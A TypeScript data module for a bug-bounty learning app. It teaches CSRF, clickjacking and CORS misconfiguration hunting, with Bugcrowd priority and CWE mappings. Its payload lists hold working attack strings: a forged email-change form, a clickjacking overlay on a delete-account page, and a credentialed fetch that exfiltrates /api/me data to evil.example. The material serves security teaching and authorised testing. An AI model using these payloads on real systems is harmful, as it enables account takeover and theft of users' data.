import type { LearnGroup } from "@/learn/data/types";

// CSRF & CORS — advanced, P3/P4-focused learn content.
// VRT backbone: Bugcrowd Vulnerability Rating Taxonomy release 2026-07-08.
// CSRF and clickjacking are forced-action bugs; CORS is a cross-origin READ bug
// with no dedicated VRT leaf (triaged by the impact it enables).

export const csrfCorsGroup: LearnGroup = {
  id: "csrf-cors",
  name: "CSRF & CORS",
  emoji: "🎣",
  blurb:
    "Making a logged-in victim's browser act (CSRF, clickjacking) or read across origins (CORS) without their intent. In the SameSite era the win is finding the action or endpoint where the browser's defaults don't save the app.",
  topics: [
    {
      id: "csrf",
      name: "Cross-Site Request Forgery (CSRF)",
      emoji: "🎣",
      intro:
        "A state-changing request authenticated only by an ambient cookie, with no unpredictable token actually validated, can be forged from any origin the victim visits. The 2025 reality is SameSite: Chromium defaults cookies to `Lax`, which kills the naive cross-site POST — so classic blanket CSRF is mostly dead, and the live findings sit in the gaps. Lead at the action-specific nuance: a GET that changes state, a cookie explicitly set `SameSite=None`, the ~2-minute Lax+POST top-level-navigation window, a double-submit token that's settable from a sibling subdomain, or a JSON endpoint that still accepts `text/plain`. Standalone action CSRF varies in band; chain it to an account-controlling action (email/password change) and it escalates to application-wide P2.",
      howToFind: [
        {
          title: "Probe how the token is actually validated",
          steps: [
            "Capture a sensitive state-change (change email, add recipient, disable 2FA) and strip the CSRF token — if it still succeeds the token is decorative.",
            "Swap in another user's token, send an empty token, and replay a stale one: any acceptance means the token isn't bound per-session/per-request (VRT flags 'token not unique per request' as its own P5).",
            "Downgrade the method (POST→GET) and flip `Content-Type` (`application/json` → `text/plain` or `application/x-www-form-urlencoded`) to dodge both the token check and the CORS preflight — many frameworks only enforce the token on the 'expected' verb/type.",
          ],
        },
        {
          title: "Work the SameSite reality of 2025",
          steps: [
            "Read the session cookie's `SameSite`: `None` re-opens full cross-site CSRF; `Lax` still permits top-level-navigation GETs and (within ~2 minutes of being set) POSTs via form auto-submit.",
            "Hunt GET-based state changes (`/account/email?new=...`) — `Lax` sends the cookie on a top-level GET, so an auto-navigating link forges the action with no token in play.",
            "Check whether a sibling subdomain, an open redirect, or a cached response lets you plant/leak the token or satisfy a referer check — a subdomain you influence often defeats `SameSite`/double-submit assumptions.",
          ],
        },
        {
          title: "Prove it minimally and target impact",
          steps: [
            "Host an off-domain auto-submitting form (or a `fetch(..., {credentials:'include'})` for simple-request endpoints) and show the action firing in the victim session — a benign, reversible change is enough proof.",
            "Aim the PoC at an account-controlling action so the writeup carries the chain (email change → reset → ATO), which is what lifts it from action-specific to application-wide P2.",
          ],
        },
      ],
      payloads: [
        "<form action=\"https://target.example/api/account/email\" method=\"POST\"><input name=\"email\" value=\"attacker@evil.example\"></form><script>document.forms[0].submit()</script>",
        "fetch('https://target.example/api/transfer', {method:'POST', credentials:'include', headers:{'Content-Type':'text/plain'}, body:'{\"to\":\"attacker\",\"amount\":1}'})   (JSON CSRF via text/plain, no preflight)",
        "GET https://target.example/account/email?new=attacker@evil.example   (SameSite=Lax top-level navigation)",
        "Replay the request with the X-CSRF-Token header removed, then with another account's token",
      ],
      example:
        "A 'change email' endpoint accepted a POST with no CSRF token and its session cookie was set `SameSite=None` for a third-party embed. An auto-submitting form on an attacker page changed the victim's email, after which the standard password-reset gave full account takeover — forged across the whole authenticated surface, triaged application-wide P2 (CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L). The same bug on a cosmetic, non-account action would have been scored action-specific instead.",
      mapping: {
        bugcrowdVrt: "Cross-Site Request Forgery (CSRF) › Action-Specific › Authenticated Action",
        bugcrowdPriority: "varies",
        hackeroneCwe: "CWE-352: Cross-Site Request Forgery (CSRF)",
        cvssSeverity: "Depends on the action (Medium → High)",
        note:
          "Bugcrowd VRT: Application-Wide CSRF P2 (CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L); Action-Specific › Authenticated Action varies with the action; Logout CSRF P5; 'CSRF Token Not Unique Per Request' P5. Reaching an account-controlling action escalates it to application-wide P2.",
      },
      checklistCategoryId: "req-csrf",
    },
    {
      id: "clickjacking",
      name: "Clickjacking (UI Redressing)",
      emoji: "🖱️",
      intro:
        "The sensitive page is framed by an attacker and overlaid so the victim's click lands on a hidden control instead of what they think they're pressing. The bar is a missing `X-Frame-Options`/`Content-Security-Policy: frame-ancestors` on an endpoint with a one-click security-relevant action — that's the P4 'Sensitive Click-Based Action'. Two 2025 nuances raise the ceiling: third-party iframes don't carry `SameSite=Lax/Strict` cookies, so framing only bites where the action rides a `SameSite=None` session or first-party context; and 'double-clickjacking' (window-swap timed to a double-click) can land a click on a protected page even when `frame-ancestors`/XFO would block a classic frame. Lead at the P4 single-action case; form-fill and non-sensitive variants are P5.",
      howToFind: [
        {
          title: "Confirm the page is framable and build the overlay",
          steps: [
            "Request the sensitive page and check response headers for `X-Frame-Options` and a CSP `frame-ancestors` directive — absence (or a `frame-ancestors` that allows `*`/your origin) means it frames.",
            "Prove it with a PoC that loads the target in an `<iframe>` at low opacity, positioned so a decoy button sits exactly over the real sensitive control.",
            "Verify the action's auth survives framing: if it depends on a `SameSite=Lax/Strict` cookie it won't fire cross-site, so confirm either a `SameSite=None` session or a flow that keeps first-party context.",
          ],
        },
        {
          title: "Reach for double-clickjacking when framing is blocked (2025)",
          steps: [
            "When XFO/`frame-ancestors` prevents an iframe, test the window-swap technique: a lure page opens the target in a new window and uses the gap between `mousedown` and the second click of a double-click to swap focus so the second click lands on the authorize/confirm control.",
            "This sidesteps anti-framing headers and SameSite because the action happens in a top-level window — demonstrate it only against a benign, reversible action.",
          ],
        },
        {
          title: "Classify the action to set the band",
          steps: [
            "A single hidden click that triggers a security-relevant change (delete account, authorize an OAuth app, change a setting) is the P4 Sensitive Click-Based Action.",
            "Multi-step form input you can force (fill-and-submit) is Form Input P5; framing a non-sensitive action is P5 — report the honest variant rather than overstating.",
          ],
        },
      ],
      payloads: [
        "<style>iframe{position:absolute;opacity:0.0001;top:0;left:0;width:1000px;height:800px;z-index:2}#decoy{position:absolute;top:320px;left:260px;z-index:1}</style><div id=\"decoy\">Click to win</div><iframe src=\"https://target.example/settings/delete-account\"></iframe>",
        "Double-clickjacking skeleton: window.open('https://target.example/oauth/authorize?...'); then time a swap so the victim's second click lands on 'Authorize'",
      ],
      example:
        "The 'authorize third-party app' confirmation on an OAuth consent screen shipped with no `X-Frame-Options` and no `frame-ancestors`, and the session cookie was `SameSite=None`. An overlay framed the page with a transparent 'Authorize' button under a game decoy; a single tricked click granted the attacker's app access to the victim account — a sensitive one-click action, triaged P4 (CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N) and worth more in the writeup as the first hop of an OAuth-grant chain.",
      mapping: {
        bugcrowdVrt: "Server Security Misconfiguration › Clickjacking › Sensitive Click-Based Action",
        bugcrowdPriority: "P4",
        bugcrowdCvss: "AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
        hackeroneCwe: "CWE-1021: Improper Restriction of Rendered UI Layers or Frames (UI Redressing)",
        cvssSeverity: "Low",
        note:
          "Bugcrowd VRT: Sensitive Click-Based Action P4 (CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N); Form Input P5; Non-Sensitive Action P5.",
      },
      checklistCategoryId: "req-clickjacking",
    },
    {
      id: "cors",
      name: "CORS Misconfiguration",
      emoji: "🌐",
      intro:
        "CORS is a cross-origin READ bug: when the server reflects the request `Origin` into `Access-Control-Allow-Origin` and pairs it with `Access-Control-Allow-Credentials: true` on an endpoint that returns the victim's authenticated data, any attacker page can fetch that response with the victim's cookies and read it. The subtle findability is in the trust-boundary logic — reflected arbitrary origin, trusted `null`, and sloppy prefix/suffix/regex matching (`target.com.evil.com`, `eviltarget.com`, scheme downgrade). There is no single fixed CORS leaf in Bugcrowd's VRT: it's triaged by what the read enables (commonly Broken Access Control or Sensitive Data Exposure), so the payout is set by the sensitivity of what you can read, not by CORS itself.",
      howToFind: [
        {
          title: "Probe how Origin is reflected",
          steps: [
            "Send `Origin: https://evil.example` to authenticated data endpoints (`/api/me`, `/api/account`, token/key endpoints) and inspect the response for `Access-Control-Allow-Origin: https://evil.example` together with `Access-Control-Allow-Credentials: true` — that pair is the finding.",
            "Test `Origin: null` (reachable from a sandboxed iframe or `data:`/`file:` context) and watch for `Access-Control-Allow-Origin: null` with credentials allowed.",
            "Try scheme/port downgrade (`http://` of an https site) and malformed origins to see whether the allow-logic is doing a loose comparison.",
          ],
        },
        {
          title: "Break the allowlist regex / matching logic",
          steps: [
            "Suffix match: `https://target.com.evil.example` — passes a check that only asks 'does it end in target.com?' when the dot isn't anchored.",
            "Prefix/substring match: `https://evil-target.com` or `https://targetxcom.evil.example` to beat naive `startsWith`/`contains` checks; also unescaped-dot regexes where `.` matches any char.",
            "If only subdomains are trusted, pivot: an XSS or subdomain takeover on a trusted `*.target.com` origin gives you a whitelisted origin to fetch from.",
          ],
        },
        {
          title: "Prove the credentialed read safely",
          steps: [
            "From an attacker-controlled page, `fetch(victimEndpoint, {credentials:'include'})` and read a benign marker from the response (the victim's own email or a non-secret field) to demonstrate cross-origin exfiltration — don't harvest at scale.",
            "Document that it requires `Allow-Credentials: true` plus a reflected/over-broad origin and returns private data; without credentials or without sensitive data in the body, it's typically not rewardable.",
          ],
        },
      ],
      payloads: [
        "curl -s -I https://target.example/api/me -H \"Origin: https://evil.example\"   (look for ACAO reflected + ACAC: true)",
        "curl -s -I https://target.example/api/me -H \"Origin: null\"",
        "Origin: https://target.example.evil.example   and   Origin: https://eviltarget.example   (suffix/prefix bypass)",
        "<script>fetch('https://target.example/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://evil.example/log?d='+encodeURIComponent(d)))</script>",
      ],
      example:
        "`GET /api/account` reflected whatever `Origin` was sent into `Access-Control-Allow-Origin` and returned `Access-Control-Allow-Credentials: true`, while the body contained the user's email, API token, and CSRF token. An attacker page read the whole response cross-origin with the victim's cookies; the leaked API token then enabled account takeover. Because the VRT has no dedicated CORS leaf, triage filed it under Broken Access Control / Sensitive Data Exposure and scored it on the sensitivity of the exfiltrated data.",
      mapping: {
        bugcrowdVrt: "No dedicated VRT leaf — triaged by impact (commonly Broken Access Control / Sensitive Data Exposure)",
        bugcrowdPriority: "varies",
        hackeroneCwe: "CWE-942: Permissive Cross-domain Policy with Untrusted Domains",
        cvssSeverity: "Depends on impact (what the misconfiguration lets an attacker read)",
        note:
          "Bugcrowd does not assign CORS its own VRT leaf — it's triaged by the impact it enables. What makes it pay is a reflected (or over-broad) Origin plus Access-Control-Allow-Credentials: true on an endpoint that returns sensitive authenticated data, giving a credentialed cross-origin read; without credentials or sensitive data it's usually not rewardable.",
      },
      checklistCategoryId: "req-cors",
    },
  ],
};
